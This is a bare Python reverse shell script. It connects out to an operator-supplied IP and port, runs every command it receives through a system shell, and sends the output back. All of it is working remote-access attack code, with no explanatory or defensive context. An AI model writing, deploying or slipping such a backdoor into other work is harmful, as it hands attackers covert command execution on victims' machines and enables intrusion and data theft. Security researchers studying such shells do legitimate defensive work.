#!/usr/bin/env python3
import subprocess,socket,os
 
# Enter IP address and port
HOST = 'Insert Host IP here'
PORT = 'Insert PORT here'
# Configure socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall('\nHello Operator!\nEOFX'.encode())
 
while True:
    data = s.recv(1024)
    if data.decode() == "quit": break
    elif data.decode()[:2] == "cd":
        try: os.chdir(data.decode()[3:])
        except: pass
    else:
        proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()
        stdoutput.decode()
        s.sendall(stdoutput)
    s.sendall('EOFX'.encode())
# Loop ends here
s.send('Bye!'.encode())
s.close()

